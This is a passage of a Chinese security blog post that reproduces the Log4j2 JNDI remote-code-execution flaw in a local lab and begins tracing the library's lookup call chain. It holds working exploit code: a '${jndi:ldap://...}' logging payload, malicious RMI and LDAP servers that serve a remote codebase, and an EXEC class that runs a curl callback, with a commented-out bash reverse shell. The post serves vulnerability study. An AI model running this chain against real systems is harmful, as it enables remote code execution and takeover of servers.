+</span></span><span class="line"><span class="cl">        <span class="n">Logger</span> <span class="n">logger</span> <span class="o">=</span> <span class="n">LogManager</span><span class="o">.</span><span class="na">getLogger</span><span class="o">(</span><span class="n">log4j2rce</span><span class="o">.</span><span class="na">class</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="cm">/* 使用${jndi:key}时,将会调用JndiLookup的lookup方法 使用jndi(javax.naming)获取value */</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// logger.fatal(&#34;${jndi:rmi://127.0.0.1:1099/exp}&#34;);//RMI方式复现
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="s">&#34;${jndi:ldap://127.0.0.1:1389/exp}&#34;</span><span class="o">);</span><span class="c1">//LDAP方法复现
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>RMI</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2023/02/786a8a1f3aa4ee95f6aacf5cad388792.png"
+        data-srcset="https://img.mi3aka.eu.org/2023/02/786a8a1f3aa4ee95f6aacf5cad388792.png, https://img.mi3aka.eu.org/2023/02/786a8a1f3aa4ee95f6aacf5cad388792.png 1.5x, https://img.mi3aka.eu.org/2023/02/786a8a1f3aa4ee95f6aacf5cad388792.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2023/02/786a8a1f3aa4ee95f6aacf5cad388792.png"
+        title="https://img.mi3aka.eu.org/2023/02/786a8a1f3aa4ee95f6aacf5cad388792.png" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">learn.RMIServer</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">EXEC</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="nf">EXEC</span><span class="o">()</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="c1">// String command = &#34;bash -c $@|bash 0 echo bash -i &gt;&amp; /dev/tcp/127.0.0.1/7000 0&gt;&amp;1&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">String</span> <span class="n">command</span> <span class="o">=</span> <span class="s">&#34;curl http://rmi.5f573be3.dns.1433.eu.org&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Process</span> <span class="n">pc</span> <span class="o">=</span> <span class="n">Runtime</span><span class="o">.</span><span class="na">getRuntime</span><span class="o">().</span><span class="na">exec</span><span class="o">(</span><span class="n">command</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">pc</span><span class="o">.</span><span class="na">waitFor</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">new</span> <span class="n">EXEC</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">learn.RMIServer</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.sun.jndi.rmi.registry.ReferenceWrapper</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.naming.Reference</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.rmi.registry.LocateRegistry</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.rmi.registry.Registry</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Server</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">createRegistry</span><span class="o">(</span><span class="mi">1099</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Registry</span> <span class="n">registry</span> <span class="o">=</span> <span class="n">LocateRegistry</span><span class="o">.</span><span class="na">getRegistry</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Reference</span> <span class="n">reference</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Reference</span><span class="o">(</span><span class="s">&#34;learn.RMIServer.EXEC&#34;</span><span class="o">,</span> <span class="s">&#34;learn.RMIServer.EXEC&#34;</span><span class="o">,</span> <span class="kc">null</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ReferenceWrapper</span> <span class="n">referenceWrapper</span> <span class="o">=</span> <span class="k">new</span> <span class="n">ReferenceWrapper</span><span class="o">(</span><span class="n">reference</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">registry</span><span class="o">.</span><span class="na">bind</span><span class="o">(</span><span class="s">&#34;exp&#34;</span><span class="o">,</span> <span class="n">referenceWrapper</span><span class="o">);</span><span class="c1">// rmi://127.0.0.1:1099/exp
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>LDAP</li>
+</ul>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2023/02/9f1e56db6355463988b3160c38451209.png"
+        data-srcset="https://img.mi3aka.eu.org/2023/02/9f1e56db6355463988b3160c38451209.png, https://img.mi3aka.eu.org/2023/02/9f1e56db6355463988b3160c38451209.png 1.5x, https://img.mi3aka.eu.org/2023/02/9f1e56db6355463988b3160c38451209.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2023/02/9f1e56db6355463988b3160c38451209.png"
+        title="https://img.mi3aka.eu.org/2023/02/9f1e56db6355463988b3160c38451209.png" /></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2023/02/66de82a7d4f9377afc9ed5348b4a4fd4.png"
+        data-srcset="https://img.mi3aka.eu.org/2023/02/66de82a7d4f9377afc9ed5348b4a4fd4.png, https://img.mi3aka.eu.org/2023/02/66de82a7d4f9377afc9ed5348b4a4fd4.png 1.5x, https://img.mi3aka.eu.org/2023/02/66de82a7d4f9377afc9ed5348b4a4fd4.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2023/02/66de82a7d4f9377afc9ed5348b4a4fd4.png"
+        title="https://img.mi3aka.eu.org/2023/02/66de82a7d4f9377afc9ed5348b4a4fd4.png" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span> <span class="nn">learn.LDAPServer</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">java.net.*</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.net.ServerSocketFactory</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.net.SocketFactory</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">javax.net.ssl.SSLSocketFactory</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.unboundid.ldap.listener.InMemoryDirectoryServer</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.unboundid.ldap.listener.InMemoryDirectoryServerConfig</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.unboundid.ldap.listener.InMemoryListenerConfig</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.unboundid.ldap.sdk.Entry</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.unboundid.ldap.sdk.LDAPResult</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">com.unboundid.ldap.sdk.ResultCode</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Server</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">LDAP_BASE</span> <span class="o">=</span> <span class="s">&#34;dc=example,dc=com&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">http_server_ip</span> <span class="o">=</span> <span class="s">&#34;10.10.10.1&#34;</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">int</span> <span class="n">ldap_port</span> <span class="o">=</span> <span class="mi">1389</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">final</span> <span class="kt">int</span> <span class="n">http_server_port</span> <span class="o">=</span> <span class="mi">8000</span><span class="o">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">private</span> <span class="kd">static</span> <span class="kd">class</span> <span class="nc">OperationInterceptor</span> <span class="kd">extends</span> <span class="n">InMemoryOperationInterceptor</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nd">@Override</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">public</span> <span class="kt">void</span> <span class="nf">processSearchResult</span><span class="o">(</span><span class="n">InMemoryInterceptedSearchResult</span> <span class="n">result</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">String</span> <span class="n">base</span> <span class="o">=</span> <span class="n">result</span><span class="o">.</span><span class="na">getRequest</span><span class="o">().</span><span class="na">getBaseDN</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="n">Entry</span> <span class="n">e</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Entry</span><span class="o">(</span><span class="n">base</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="c1">// e.addAttribute(&#34;javaClassName&#34;, &#34;learn.LDAPServer.EXEC&#34;);// 类名
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="c1">// e.addAttribute(&#34;javaFactory&#34;, &#34;learn.LDAPServer.EXEC&#34;);//工厂类名
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">e</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">&#34;javaCodeBase&#34;</span><span class="o">,</span> <span class="s">&#34;http://&#34;</span> <span class="o">+</span> <span class="n">http_server_ip</span> <span class="o">+</span> <span class="s">&#34;:&#34;</span> <span class="o">+</span> <span class="n">http_server_port</span> <span class="o">+</span> <span class="s">&#34;/&#34;</span><span class="o">);</span><span class="c1">// 设置远程的恶意引用对象的地址
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="n">e</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">&#34;objectClass&#34;</span><span class="o">,</span> <span class="s">&#34;javaNamingReference&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">e</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">&#34;javaClassName&#34;</span><span class="o">,</span> <span class="s">&#34;EXEC&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">e</span><span class="o">.</span><span class="na">addAttribute</span><span class="o">(</span><span class="s">&#34;javaFactory&#34;</span><span class="o">,</span> <span class="s">&#34;EXEC&#34;</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">result</span><span class="o">.</span><span class="na">sendSearchEntry</span><span class="o">(</span><span class="n">e</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">                <span class="n">result</span><span class="o">.</span><span class="na">setResult</span><span class="o">(</span><span class="k">new</span> <span class="n">LDAPResult</span><span class="o">(</span><span class="mi">0</span><span class="o">,</span> <span class="n">ResultCode</span><span class="o">.</span><span class="na">SUCCESS</span><span class="o">));</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e1</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">                <span class="n">e1</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">            <span class="o">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="n">Exception</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">InMemoryDirectoryServerConfig</span> <span class="n">config</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InMemoryDirectoryServerConfig</span><span class="o">(</span><span class="n">LDAP_BASE</span><span class="o">);</span><span class="c1">// 创建LDAP配置对象
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">config</span><span class="o">.</span><span class="na">setListenerConfigs</span><span class="o">(</span><span class="k">new</span> <span class="n">InMemoryListenerConfig</span><span class="o">(</span><span class="s">&#34;listen&#34;</span><span class="o">,</span> <span class="n">InetAddress</span><span class="o">.</span><span class="na">getByName</span><span class="o">(</span><span class="s">&#34;0.0.0.0&#34;</span><span class="o">),</span> <span class="n">ldap_port</span><span class="o">,</span>
+</span></span><span class="line"><span class="cl">                    <span class="n">ServerSocketFactory</span><span class="o">.</span><span class="na">getDefault</span><span class="o">(),</span> <span class="n">SocketFactory</span><span class="o">.</span><span class="na">getDefault</span><span class="o">(),</span>
+</span></span><span class="line"><span class="cl">                    <span class="o">(</span><span class="n">SSLSocketFactory</span><span class="o">)</span> <span class="n">SSLSocketFactory</span><span class="o">.</span><span class="na">getDefault</span><span class="o">()));</span><span class="c1">// 设置LDAP监听配置信息
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">config</span><span class="o">.</span><span class="na">addInMemoryOperationInterceptor</span><span class="o">(</span><span class="k">new</span> <span class="n">OperationInterceptor</span><span class="o">());</span><span class="c1">// 添加自定义的LDAP操作拦截器
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">InMemoryDirectoryServer</span> <span class="n">ds</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InMemoryDirectoryServer</span><span class="o">(</span><span class="n">config</span><span class="o">);</span><span class="c1">// 创建LDAP服务对象
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">ds</span><span class="o">.</span><span class="na">startListening</span><span class="o">();</span><span class="c1">// 开始监听
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="s">&#34;Listening on 0.0.0.0:&#34;</span> <span class="o">+</span> <span class="n">ldap_port</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">Exception</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">e</span><span class="o">.</span><span class="na">printStackTrace</span><span class="o">();</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="链条分析">链条分析</h2>
+<h3 id="日志记录">日志记录</h3>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2023/02/1d21a672ada346096bd6d56b24054b71.png"
+        data-srcset="https://img.mi3aka.eu.org/2023/02/1d21a672ada346096bd6d56b24054b71.png, https://img.mi3aka.eu.org/2023/02/1d21a672ada346096bd6d56b24054b71.png 1.5x, https://img.mi3aka.eu.org/2023/02/1d21a672ada346096bd6d56b24054b71.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2023/02/1d21a672ada346096bd6d56b24054b71.png"
+        title="https://img.mi3aka.eu.org/2023/02/1d21a672ada346096bd6d56b24054b71.png" /></p>
+<p>在<code>org.apache.logging.log4j.spi.AbstractLogger</code>中存在多个<code>logIfEnabled</code>的重载方法,这些方法根据当前配置的日志记录级别,来判断是否需要进行<code>logMessage</code>操作</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//org.apache.logging.log4j.spi.AbstractLogger
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">public</span> <span class="kt">void</span> <span class="nf">logIfEnabled</span><span class="o">(</span><span class="kd">final</span> <span class="n">String</span> <span class="n">fqcn</span><span class="o">,</span> <span class="kd">final</span> <span class="n">Level</span> <span class="n">level</span><span class="o">,</span> <span class="kd">final</span> <span class="n">Marker</span> <span class="n">marker</span><span class="o">,</span> <span class="kd">final</span> <span class="n">String</span> <span class="n">message</span><span class="o">,</span>
+</span></span><span class="line"><span class="cl">            <span class="kd">final</span> <span class="n">Throwable</span> <span class="n">t</span><span class="o">)</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="o">(</span><span class="n">isEnabled</span><span class="o">(</span><span class="n">level</span><span class="o">,</span> <span class="n">marker</span><span class="o">,</span> <span class="n">message</span><span class="o">,</span> <span class="n">t</span><span class="o">))</span> <span class="o">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">logMessage</span><span class="o">(</span><span class="n">fqcn</span><span class="o">,</span> <span class="n">level</span><span class="o">,</span> <span class="n">marker</span><span class="o">,</span> <span class="n">message</span><span class="o">,</span> <span class="n">t</span><span class="o">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="字符串处理">字符串处理</h3>
+<p>在<code>substitute</code>方法中对字符串进行替换操作</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://img.mi3aka.eu.org/2023/02/99c0244746109696464480b5e39b5749.png"
+        data-srcset="https://img.mi3aka.eu.org/2023/02/99c0244746109696464480b5e39b5749.png, https://img.mi3aka.eu.org/2023/02/99c0244746109696464480b5e39b5749.png 1.5x, https://img.mi3aka.eu.org/2023/02/99c0244746109696464480b5e39b5749.png 2x"
+        data-sizes="auto"
+        alt="https://img.mi3aka.eu.org/2023/02/99c0244746109696464480b5e39b5749.png"
+        title="https://img.mi3aka.eu.org/2023/02/99c0244746109696464480b5e39b5749.png" /></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
+</span><span class="lnt"> 55
+</span><span class="lnt"> 56
+</span><span class="lnt"> 57
+</span><span class="lnt"> 58
+</span><span class="lnt"> 59
+</span><span class="lnt"> 60
+</span><span class="lnt"> 61
+</span><span class="lnt"> 62
+</span><span class="lnt"> 63
+</span><span class="lnt"> 64
+</span><span class="lnt"> 65
+</span><span class="lnt"> 66
+</span><span class="lnt"> 67
+</span><span class="lnt"> 68
+</span><span class="lnt"> 69
+</span><span class="lnt"> 70
+</span><span class="lnt"> 71
+</span><span class="lnt"> 72
+</span><span class="lnt"> 73
+</span><span class="lnt"> 74
+</span><span class="lnt"> 75
+</span><span class="lnt"> 76
+</span><span class="lnt"> 77
+</span><span class="lnt"> 78
+</span><span class="lnt"> 79
+</span><span class="lnt"> 80
+</span><span class="lnt"> 81
+</span><span class="lnt"> 82
+</span><span class="lnt"> 83
+</span><span class="lnt"> 84
+</span><span class="lnt"> 85
+</span><span class="lnt"> 86
+</span><span class="lnt"> 87
+</span><span class="lnt"> 88
+</span><span class="lnt"> 89
+</span><span class="lnt"> 90
+</span><span class="lnt"> 91
+</span><span class="lnt"> 92
+</span><span class="lnt"> 93
+</span><span class="lnt"> 94
+</span><span class="lnt"> 95
+</span><span class="lnt"> 96
+</span><span class="lnt"> 97
+</span><span class="lnt"> 98
+</span><span class="lnt"> 99
+</span><span class="lnt">100
+</span><span class="lnt">101
+</span><span class="lnt">102
+</span><span class="lnt">103
+</span><span class="lnt">104
+</span><span class="lnt">105
+</span><span class="lnt">106
+</span><span class="lnt">107
+</span><span class="lnt">108
+</span><span class="lnt">109
+</span><span class="lnt">110
+</span><span class="lnt">111
+</span><span class="lnt">112
+</span><span class="lnt">113
+</span><span class="lnt">114
+</span><span class="lnt">115
+</span><span class="lnt">116
+</span><span class="lnt">117
+</span><span class="lnt">118
+</span><span class="lnt">119
+</span><span class="lnt">120
+</span><span class="lnt">121
+</span><span class="lnt">122
+</span><span class="lnt">123
+</span><span class="lnt">124
+</span><span class="lnt">125
+</span><span class="lnt">126
+</span><span class="lnt">127
+</span><span class="lnt">128
+</span><span class="lnt">129
+</span><span class="lnt">130
+</span><span class="lnt">131
+</span><span class="lnt">132
+</span><span class="lnt">133
+</span><span class="lnt">134
+</span><span class="lnt">135
+</span><span class="lnt">136
+</span><span class="lnt">137
+</span><span class="lnt">138
+</span><span class="lnt">139
+</span><span class="lnt">140
+</span><span class="lnt">141
+</span><span class="lnt">142
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//org.apache.logging.log4j.core.lookup.StrSubstitutor
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kd">private</span> <span class="kt">int</span> <span class="nf">substitute</span><span class="o">(</span><span class="kd">final</span> <span class="n">LogEvent</span> <span class="n">event</span><span class="o">,</span> <span class="kd">final</span> <span class="n">StringBuilder</span> <span class="n">buf</span><span class="o">,</span> <span class="kd">final</span> <span class="kt">int</span> <span class="n">offset</span><span class="o">,</span> <span class="kd">final</span> <span class="kt">int</span> <span class="n">length</span><span class="o">,</span> <span class="n">List</span><span class="o">&lt;</span><span class="n">String</span><span class="o">&gt;</span> <span class="n">priorVariables</span><span class="o">)</span> <span class="o">{</span>
